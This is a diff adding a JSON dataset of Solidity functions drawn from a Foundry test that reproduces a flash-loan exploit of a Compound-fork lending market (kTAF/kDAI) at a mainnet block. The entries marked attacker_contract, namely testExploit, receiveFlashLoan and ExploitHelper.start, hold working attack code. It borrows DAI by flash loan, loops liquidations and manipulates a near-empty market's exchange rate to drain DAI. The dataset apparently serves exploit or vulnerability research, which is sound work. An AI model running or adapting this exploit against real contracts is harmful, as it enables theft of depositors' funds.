@@ -1,0 +1,142 @@
+[
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "receiveFlashLoan",
+    "original_code": "    function receiveFlashLoan(\n        address[] calldata tokens,\n        uint256[] calldata amounts,\n        uint256[] calldata feeAmounts,\n        bytes calldata userData\n    ) external {\n        DAI.approve(address(kDAI), type(uint256).max);\n\n        while (true) {\n            uint256 repayAmount = kDAI.borrowBalanceStored(borrower) / 10;\n            (, uint256 numCtokenCollateral) =\n                Unitroller.liquidateCalculateSeizeTokens(address(kDAI), address(kTAF), repayAmount);\n\n            if (numCtokenCollateral <= kTAF.balanceOf(borrower)) {\n                kDAI.liquidateBorrow(borrower, repayAmount, address(kTAF));\n            } else {\n                repayAmount =\n                    ((kDAI.borrowBalanceStored(borrower) / 10) * kTAF.balanceOf(borrower)) / numCtokenCollateral;\n                kDAI.liquidateBorrow(borrower, repayAmount, address(kTAF));\n\n                while (DAI.balanceOf(address(kDAI)) > 1) {\n                    kTAF.redeem(kTAF.balanceOf(address(this)));\n                    ExploitHelper helper = new ExploitHelper();\n                    TAF.transfer(address(helper), TAF.balanceOf(address(this)));\n\n                    helper.start();\n                    kDAI.liquidateBorrow(address(helper), 1, address(kTAF));\n                    kTAF.redeem(1);\n                }\n                DAI.transfer(address(Vault), amounts[0]);\n                break;\n            }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 18_385_885);\n        vm.label(address(Vault), \"Vault\");\n        vm.label(address(DAI), \"DAI\");\n        vm.label(address(kTAF), \"kTAF\");\n        vm.label(address(kDAI), \"kDAI\");\n        vm.label(address(Unitroller), \"Unitroller\");\n        vm.label(borrower, \"borrower\");\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() public {\n        emit log_named_decimal_uint(\"Attacker DAI balance before exploit\", DAI.balanceOf(address(this)), DAI.decimals());\n\n        emit log_named_decimal_uint(\"Attacker TAF balance before exploit\", TAF.balanceOf(address(this)), TAF.decimals());\n\n        address[] memory tokens = new address[](1);\n        tokens[0] = address(DAI);\n        uint256[] memory amounts = new uint256[](1);\n        amounts[0] = 4000 * 1e18;\n        Vault.flashLoan(address(this), tokens, amounts, bytes(\"\"));\n\n        emit log_named_decimal_uint(\"Attacker DAI balance after exploit\", DAI.balanceOf(address(this)), DAI.decimals());\n\n        emit log_named_decimal_uint(\"Attacker TAF balance after exploit\", TAF.balanceOf(address(this)), TAF.decimals());\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IComptroller",
+    "source_type": "victim_contract",
+    "function_name": "enterMarkets",
+    "original_code": "    function enterMarkets(address[] memory cTokens) public returns (uint[] memory) {\n        uint len = cTokens.length;\n\n        uint[] memory results = new uint[](len);\n        for (uint i = 0; i < len; i++) {\n            CToken cToken = CToken(cTokens[i]);\n\n            results[i] = uint(addToMarketInternal(cToken, msg.sender));\n        }\n\n        return results;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IComptroller",
+    "source_type": "victim_contract",
+    "function_name": "liquidateCalculateSeizeTokens",
+    "original_code": "    function liquidateCalculateSeizeTokens(\n        address cTokenBorrowed,\n        address cTokenCollateral,\n        uint repayAmount) external view returns (uint, uint);\n}\n\n// File: contracts/InterestRateModel.sol\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICErc20Immutable",
+    "source_type": "victim_contract",
+    "function_name": "borrow",
+    "original_code": "    function borrow(uint borrowAmount) external returns (uint) {\n        return borrowInternal(borrowAmount);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICErc20Immutable",
+    "source_type": "victim_contract",
+    "function_name": "borrowBalanceStored",
+    "original_code": "    function borrowBalanceStored(address account) public view returns (uint) {\n        (MathError err, uint result) = borrowBalanceStoredInternal(account);\n        require(err == MathError.NO_ERROR, \"borrowBalanceStored: borrowBalanceStoredInternal failed\");\n        return result;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICErc20Immutable",
+    "source_type": "victim_contract",
+    "function_name": "liquidateBorrow",
+    "original_code": "    function liquidateBorrow(address borrower, uint repayAmount, CTokenInterface cTokenCollateral) external returns (uint) {\n        (uint err,) = liquidateBorrowInternal(borrower, repayAmount, cTokenCollateral);\n        return err;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ExploitHelper",
+    "source_type": "attacker_contract",
+    "function_name": "start",
+    "original_code": "    function start() external {\n        address[] memory cTokens = new address[](1);\n        cTokens[0] = address(kTAF);\n        Unitroller.enterMarkets(cTokens);\n\n        TAF.transfer(address(kTAF), 1);\n        TAF.approve(address(kTAF), type(uint256).max);\n        uint256 amountTAF = TAF.balanceOf(address(this));\n        kTAF.mint(TAF.balanceOf(address(this)));\n        kTAF.redeem(kTAF.balanceOf(address(this)) - 2);\n        TAF.transfer(address(kTAF), TAF.balanceOf(address(this)));\n\n        uint256 amountDAI = DAI.balanceOf(address(kDAI));\n        if (amountDAI > 1320 * 1e18) {\n            amountDAI = 1320 * 1e18;\n        }\n        kDAI.borrow(amountDAI);\n\n        kTAF.redeemUnderlying(amountTAF);\n\n        DAI.transfer(msg.sender, amountDAI);\n        TAF.transfer(msg.sender, amountTAF);\n    }\n",
+    "description": ""
+  }
+]
